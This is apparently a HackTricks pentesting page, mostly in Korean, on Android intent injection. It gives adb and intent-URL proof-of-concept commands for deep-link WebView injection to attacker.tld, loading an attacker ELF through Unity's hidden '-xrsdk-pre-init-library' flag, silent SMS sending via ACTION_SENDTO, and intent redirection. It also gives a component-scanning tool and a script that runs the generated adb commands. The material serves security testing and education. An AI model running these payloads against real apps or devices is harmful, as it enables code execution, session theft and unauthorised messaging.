# Intent Injection

{{#include ../../banners/hacktricks-training.md}}

Intent injection은 공격자가 제어하는 Intents 또는 이후 Intents로 변환되는 데이터를 수용하는 컴포넌트를 악용한다. Android 앱 pentests에서 매우 흔한 두 가지 패턴은 다음과 같다:

- 공격자가 만든 extras를 exported Activities/Services/BroadcastReceivers에 전달하여 이후 권한이 있는, non-exported 컴포넌트로 전달되게 하는 것.
- exported VIEW/BROWSABLE deep links를 트리거하여 공격자가 제어하는 URL을 내부 WebViews나 다른 민감한 sinks로 전달하는 것.

## Deep links → WebView sink (URL parameter injection)

앱이 다음과 같은 custom scheme deep link를 노출하는 경우:
```text
myscheme://com.example.app/web?url=<attacker_url>
```
수신하는 Activity가 `url` 쿼리 매개변수를 WebView로 전달한다면, 앱이 자신의 WebView 컨텍스트에서 임의의 원격 콘텐츠를 렌더링하도록 강제할 수 있습니다.

adb를 통한 PoC:
```bash
# Implicit VIEW intent
adb shell am start -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"

# Or explicitly target an Activity
adb shell am start -n com.example/.MainActivity -a android.intent.action.VIEW \
-d "myscheme://com.example.app/web?url=https://attacker.tld/payload.html"
```
Impact
- HTML/JS가 앱의 WebView 프로필 내에서 실행됩니다.
- JavaScript가 활성화되어 있는 경우(기본값이거나 검증 순서가 잘못되어 발생), 노출된 `@JavascriptInterface` 객체를 열거/사용하고, WebView cookies/local storage를 탈취하며 pivot할 수 있습니다.

See also:

{{#ref}}
webview-attacks.md
{{#endref}}

## Order-of-checks bug enabling JavaScript

반복적으로 발생하는 버그는 최종 URL 허용 목록/검증이 완료되기 전에 JavaScript(또는 기타 관대한 WebView 설정)를 활성화하는 것입니다. 초기 헬퍼들이 딥링크를 수락하고 먼저 WebView를 구성하면, 이후 검증이 잘못되었거나 늦더라도 최종 로드는 이미 JavaScript가 활성화된 상태로 발생합니다.

What to look for in decompiled code:
- URL을 서로 다르게 파싱/분할/재구성하는 여러 helpers (정규화 불일치).
- 마지막 호스트/경로 허용 목록 검사 이전에 `getSettings().setJavaScriptEnabled(true)`를 호출하는 경우.
- 다음과 같은 파이프라인: parse → partial validate → configure WebView → final verify → loadUrl.


## Unity Runtime: Intent-to-CLI extras → pre-init native library injection (RCE)

Unity 기반 Android 앱은 일반적으로 진입 Activity로 `com.unity3d.player.UnityPlayerActivity`(또는 `UnityPlayerGameActivity`)를 사용합니다. Unity의 Android 템플릿은 `unity`라는 이름의 특별한 Intent extra를 Unity 런타임용 커맨드라인 플래그 문자열로 처리합니다. 진입 Activity가 exported되어 있을 때(많은 템플릿의 기본값), 로컬 앱은 물론 `BROWSABLE`이 있으면 웹사이트도 이 extra를 제공할 수 있습니다.

문서화되지 않은 위험한 플래그는 프로세스 초기화 아주 초기에 네이티브 코드 실행으로 이어집니다:

- Hidden flag: `-xrsdk-pre-init-library <absolute-path>`
- Effect: `dlopen(<absolute-path>, RTLD_NOW)`가 초기화 초기에 호출되어, 타깃 앱 프로세스 내에서 공격자가 제어하는 ELF를 해당 프로세스의 UID와 권한으로 로드합니다.

Reverse-engineering excerpt (simplified):
```c
// lookup the arg value
initLibPath = FUN_00272540(uVar5, "xrsdk-pre-init-library");
// load arbitrary native library early
lVar2 = dlopen(initLibPath, 2); // RTLD_NOW
```
왜 작동하는가
- The Intent extra `unity`는 Unity 런타임 플래그로 파싱됩니다.
- pre-init flag를 제공하면 Unity가 허용된 linker namespace 경로 내의 attacker-controlled ELF 경로를 가리키게 됩니다(아래 제약 참조).

악용 조건
- Unity entry Activity가 exported되어 있어야 합니다(일반적으로 기본값으로 true).
- For one-click remote via browser: entry Activity는 `android.intent.category.BROWSABLE`도 선언해야 하며, 그래야 `intent:` URL에서 extras를 전달할 수 있습니다.

로컬 악용(같은 기기)
1) 피해자 앱이 읽을 수 있는 경로에 payload ELF를 배치하세요. 가장 쉬운 방법: 자신의 attacker app에 악성 라이브러리를 포함시키고 attacker’s manifest에 설정하여 `/data/app/.../lib/<abi>/` 아래에 추출되도록 하세요:
```xml
<application android:extractNativeLibs="true" ...>
```
2) `unity` extra의 CLI pre-init 플래그로 피해자의 Unity activity를 실행합니다. ADB PoC 예:
```bash
adb shell am start \
-n com.victim.pkg/com.unity3d.player.UnityPlayerActivity \
-e unity "-xrsdk-pre-init-library /data/app/~~ATTACKER_PKG==/lib/arm64/libpayload.so"
```
3) Unity calls `dlopen("/data/.../libpayload.so", RTLD_NOW)`; your payload runs in the victim process, inheriting all its app permissions (camera/mic/network/storage, etc.) and access to in-app sessions/data.

Notes
- The exact `/data/app/...` path varies across devices/installs. An attacker app can retrieve its own native lib dir at runtime via `getApplicationInfo().nativeLibraryDir` and communicate it to the trigger.
- The file need not end with `.so` if it is a valid ELF – `dlopen()` cares about ELF headers, not extensions.

Remote one‑click via browser (conditional)
If the Unity entry activity is exported with `BROWSABLE`, a website can pass extras via an `intent:` URL:
```text
intent:#Intent;package=com.example.unitygame;scheme=whatever;\
S.unity=-xrsdk-pre-init-library%20/data/local/tmp/malicious.so;end;
```
그러나 최신 Android에서는 동적 링커 네임스페이스와 SELinux가 여러 공개 경로(예: `/sdcard/Download`)에서의 로드를 차단합니다. 다음과 같은 오류가 표시됩니다:
```
library "/sdcard/Download/libtest.so" ("/storage/emulated/0/Download/libtest.so") needed
or dlopened by "/data/app/.../lib/arm64/libunity.so" is not accessible for the
namespace: [name="clns-...", ... permitted_paths="/data:/mnt/expand:/data/data/com.example.unitygame"]
```
Bypass strategy: 공격자가 제어하는 바이트를 앱의 비공개 저장소(예: HTTP caches)에 캐시하는 앱을 노리세요. 허용 경로에 `/data`와 앱의 private dir가 포함되므로, `-xrsdk-pre-init-library`를 앱 캐시 내부의 절대 경로로 가리키면 링커 제약을 만족시켜 코드 실행을 얻을 수 있습니다. 이는 다른 Android 앱들에서 관찰된 이전의 cache-to-ELF RCE 패턴을 반영합니다.


## Confused‑Deputy: Silent SMS/MMS via ACTION_SENDTO (Wear OS Google Messages)

일부 기본 메시징 앱은 암묵적 메시지 인텐트를 잘못 자동 실행하여 confused‑deputy primitive가 됩니다: 권한이 없는 앱도 `Intent.ACTION_SENDTO`를 `sms:`, `smsto:`, `mms:`, 또는 `mmsto:`와 함께 트리거하여 확인 UI 없이 그리고 `SEND_SMS` 권한 없이 즉시 전송을 발생시킬 수 있습니다.

Key points
- Trigger: implicit `ACTION_SENDTO` + messaging URI scheme.
- Data: 수신자는 URI에 설정, 메시지 텍스트는 `"sms_body"` extra에 설정.
- Permissions: 없음 (no `SEND_SMS`), 기본 SMS/MMS 핸들러에 의존.
- Observed: Google Messages for Wear OS (patched May 2025). 다른 핸들러들도 유사하게 평가해야 합니다.

Minimal payload (Kotlin)
```kotlin
val intent = Intent(Intent.ACTION_SENDTO).apply {
data = Uri.parse("smsto:+11234567890") // or sms:, mms:, mmsto:
putExtra("sms_body", "Hi from PoC")
// From a non-Activity context add NEW_TASK
addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
}
startActivity(intent)
```
ADB PoC (특별한 권한 없음)
```bash
# SMS/SMS-to
adb shell am start -a android.intent.action.SENDTO -d "smsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "sms:+11234567890"   --es sms_body "hello"

# MMS/MMS-to (handler-dependent behaviour)
adb shell am start -a android.intent.action.SENDTO -d "mmsto:+11234567890" --es sms_body "hello"
adb shell am start -a android.intent.action.SENDTO -d "mms:+11234567890"   --es sms_body "hello"
```
공격 표면 확장 (Wear OS)
- 액티비티를 시작할 수 있는 모든 컴포넌트는 동일한 페이로드를 발사할 수 있습니다: Activities, foreground Services (with `FLAG_ACTIVITY_NEW_TASK`), Tiles, Complications.
- 기본 핸들러가 자동으로 전송하면, OEM 정책에 따라 백그라운드 컨텍스트에서 원탭(one‑tap) 또는 완전히 무음으로 악용될 수 있습니다.

Pentest checklist
- Resolve `ACTION_SENDTO` on target to identify the default handler; verify whether it shows a compose UI or silently sends.
- 모든 네 가지 스킴(`sms:`, `smsto:`, `mms:`, `mmsto:`)과 extras (`sms_body`, 선택적으로 MMS의 경우 `subject`)를 사용해 동작 차이를 확인하세요.
- 실제 기기에서 테스트할 경우 요금이 부과되는 목적지/프리미엄 요금 번호를 고려하세요.


## 기타 전형적인 Intent injection 기법

- startActivity/sendBroadcast를 통해 공격자가 제공한 `Intent` extras를 사용하고, 이후 다시 파싱(`Intent.parseUri(...)`)되어 실행되는 경우.
- 권한 검증 없이 Intents를 non-exported 민감 컴포넌트로 전달하는 exported 프록시 컴포넌트.

---

## Exported-component 테스트 자동화 (Smali-driven ADB generation)

exported 컴포넌트가 특정 extras를 기대할 때, 페이로드 형태를 추측하는 것은 시간 낭비와 false negatives를 초래합니다. Smali에서 키/타입을 직접 찾아내어 바로 실행 가능한 adb 명령을 생성하도록 자동화할 수 있습니다.

Tool: APK Components Inspector
- Repo: https://github.com/thecybersandeep/apk-components-inspector
- Approach: Smali를 디컴파일하고 `getStringExtra("key")`, `getIntExtra("id", ...)`, `getParcelableExtra("redirect_intent")`, `getSerializableExtra(...)`, `getBooleanExtra(...)`, `getAction()`, `getData()` 같은 호출을 스캔하여 각 컴포넌트가 소비하는 extras와 필드를 추론합니다.
- Output: 모든 exported Activity/Service/Receiver/Provider에 대해 툴은 짧은 설명과 올바른 타입 플래그가 적용된 정확한 `adb shell am ...`/`cmd content ...` 명령을 출력합니다.

설치
```bash
git clone https://github.com/thecybersandeep/apk-components-inspector
cd apk-components-inspector
python3 -m venv venv && source venv/bin/activate
pip install androguard==3.3.5 rich
```
사용법
```bash
python apk-components-inspector.py target.apk
```
예제 출력
```bash
adb shell am start -n com.target/.ExportedActivity --es url https://example.tld
adb shell am startservice -n com.target/.ExportedService --ei user_id 1337 --ez force true
adb shell am broadcast -n com.target/.ExportedReceiver -a com.target.ACTION --es redirect_intent "intent:#Intent;component=com.target/.Internal;end"
adb shell cmd content query --uri content://com.target.provider/items
```
ADB am extras 치트시트 (타입 인식 플래그)
- 문자열: `--es key value` | 문자열 배열: `--esa key v1,v2`
- 정수: `--ei key 123` | 정수 배열: `--eia key 1,2,3`
- 불리언: `--ez key true|false`
- long: `--el key 1234567890`
- 실수: `--ef key 1.23`
- URI (extra): `--eu key content://...` | Data URI (Intent data): `-d content://...`
- 컴포넌트 extra: `--ecn key com.pkg/.Cls`
- null 문자열 extra: `--esn key`
- 일반 플래그: `-a <ACTION>` `-c <CATEGORY>` `-t <MIME>` `-f <FLAGS>` `--activity-clear-task --activity-new-task`

Providers를 위한 프로 팁
- 에이전트 없이 ContentProviders에 접근하려면 `adb shell cmd content query|insert|update|delete ...`를 사용하세요.
- SQLi 탐색을 위해, 기본 provider가 SQLite 기반일 때 `--projection` 및 `--where` (aka selection)을 다양하게 시도하세요.

전체 파이프라인 자동화 (인터랙티브 executor)
```bash
# generate and capture commands then execute them one by one interactively
python apk-components-inspector.py app.apk | tee adbcommands.txt
python run_adb_commands.py
```
<details>
<summary>adb 명령을 파싱하고 실행하는 도우미 스크립트</summary>
```python
import subprocess

def parse_adb_commands(file_path):
with open(file_path, 'r') as file:
lines = file.readlines()
commands = []
current = []
for line in lines:
s = line.strip()
if s.startswith("adb "):
current = [s]
elif s.startswith("#") or not s:
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
current = []
elif current:
current.append(s)
if current:
full = ' '.join(current).replace(" \\ ", " ").replace("\\", "").strip()
commands.append(full)
return commands

for i, cmd in enumerate(parse_adb_commands('adbcommands.txt'), 1):
print(f"\nCommand {i}: {cmd}")
input("Press Enter to execute this command...")
try:
r = subprocess.run(cmd, shell=True, check=True, text=True, capture_output=True)
print("Output:\n", r.stdout)
if r.stderr:
print("Errors:\n", r.stderr)
except subprocess.CalledProcessError as e:
print(f"Command failed with error:\n{e.stderr}")
```
</details>

기기에서 실행: inspector는 Python 기반이며 `apktool`/`androguard`가 사용 가능한 Termux 또는 루팅된 휴대폰에서 작동합니다.

---

## Intent Redirection (CWE-926) – finding and exploiting

Pattern
- 외부로 노출된 진입점(Activity/Service/Receiver)이 들어오는 Intent를 읽어 출처/데이터를 검증하지 않고 내부 또는 외부로 전달하는 경우, 예:
- `startActivity(getIntent())`
- `startActivity(intent)` 여기서 `intent`는 `redirect_intent`/`next_intent`/`pending_intent` 같은 extra나 `Intent.parseUri(...)`에서 유래한 것임.
- `action`/`data`/`component` 필드를 검증 없이 신뢰하거나 호출자 신원을 확인하지 않음.

What to search in Smali/Java
- `getParcelableExtra("redirect_intent")`, `getParcelable("intent")`, `getIntent().getParcelableExtra(...)`의 사용.
- 공격자에 의해 조작된 Intent에 대해 직접 `startActivity(...)`, `startService(...)`, `sendBroadcast(...)`를 호출하는 경우.
- `getCallingPackage()`/`getCallingActivity()` 검사나 커스텀 권한 게이트의 부재.

ADB PoC templates
- 권한 있는 내부 Activity로 extra Intent를 전달하는 Proxy Activity:
```bash
adb shell am start -n com.target/.ProxyActivity \
--es redirect_intent 'intent:#Intent;component=com.target/.SensitiveActivity;end'
```
- 외부로 노출된 Service가 `redirect_intent` parcelable을 처리하는 경우:
```bash
adb shell am startservice -n com.target/.ExportedService \
--es redirect_intent 'intent:#Intent;component=com.target/.PrivService;action=com.target.DO;end'
```
- Exported Receiver가 유효성 검사 없이 중계하는 경우:
```bash
adb shell am broadcast -n com.target/.RelayReceiver -a com.target.RELAY \
--es forwarded 'intent:#Intent;component=com.target/.HiddenActivity;S.extra=1;end'
```
singleTask 스타일 동작에 유용한 플래그
```bash
# Ensure a fresh task when testing Activities that check task/intent flags
adb shell am start -n com.target/.ExportedActivity --activity-clear-task --activity-new-task
```
실제 사례 (영향은 다양함):
- CVE-2024-26131 (Element Android): exported flows가 WebView 조작, PIN 우회, 로그인 하이재킹으로 이어짐.
- CVE-2023-44121 (LG ThinQ Service): exported receiver action `com.lge.lms.things.notification.ACTION` → 시스템 수준 영향.
- CVE-2023-30728 (Samsung PackageInstallerCHN < 13.1.03.00): 리디렉션 → 임의 파일 접근 (사용자 상호작용 필요).
- CVE-2022-36837 (Samsung Email < 6.1.70.20): implicit Intents가 content를 leak함.
- CVE-2021-4438 (React Native SMS User Consent).
- CVE-2020-14116 (Xiaomi Mi Browser).


---

## References

- [Android – Access to app-protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/)
- [Samsung S24 Exploit Chain Pwn2Own 2024 Walkthrough](https://medium.com/@happyjester80/samsung-s24-exploit-chain-pwn2own-2024-walkthrough-c7a3da9a7a26)
- [Pwn2Own Ireland 2024 – Samsung S24 attack chain (whitepaper)](https://maliciouserection.com/2025/05/13/pwn2own-ireland-2024-samsung-s24-attack-chain-whitepaper.html)
- [Demonstration video](https://www.youtube.com/watch?v=LAIr2laU-So)
- [Automating Android App Component Testing with New APK Inspector (blog)](https://www.mobile-hacker.com/2025/09/18/automating-android-app-component-testing-with-new-apk-inspector/)
- [APK Components Inspector – GitHub](https://github.com/thecybersandeep/apk-components-inspector)
- [Google guidance on intent redirection](https://support.google.com/faqs/answer/9267555?hl=en)
- [OVAA vulnerable app](https://github.com/oversecured/ovaa)
- [Exported Service PoC APK](https://github.com/nhattm3006/android-poc/blob/main/Exported%20Service/poc.apk)
- [Ostorlab – 100M installs image app deep dive (component summary example)](https://medium.com/@ostorlab/this-article-is-a-technical-deep-dive-showing-how-a-100m-installation-image-application-can-6343ce8ea076)
- [CVE-2024-26131 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2024-26131)
- [CVE-2023-44121 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-44121)
- [CVE-2023-30728 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2023-30728)
- [CVE-2022-36837 – CVE.org](https://www.cve.org/CVERecord?id=CVE-2022-36837)
- [CVE-2021-4438 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-4438)
- [CVE-2020-14116 – NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-14116)
- [CVE-2025-59489 – Arbitrary Code Execution in Unity Runtime (blog)](https://flatt.tech/research/posts/arbitrary-code-execution-in-unity-runtime/)
- [Unity docs – Android custom activity command-line](https://docs.unity3d.com/6000.0/Documentation/Manual/android-custom-activity-command-line.html)
- [Unity Security Sept-2025-01 advisory](https://unity.com/security/sept-2025-01)
- [HEXACON talk – Messenger one-click cache-based RCE pattern (slides)](https://www.hexacon.fr/slides/Calvanno-Defense_through_Offense_Building_a_1-click_Exploit_Targeting_Messenger_for_Android.pdf)
- [CVE-2025-12080 — Intent Abuse in Google Messages for Wear OS](https://towerofhanoi.it/writeups/cve-2025-12080/)
- [PoC repo – io-no/CVE-2025-12080](https://github.com/io-no/CVE-Reports/tree/main/CVE-2025-12080)
- [Android docs – Intents and Intent Filters](https://developer.android.com/guide/components/intents-filters)


{{#include ../../banners/hacktricks-training.md}}
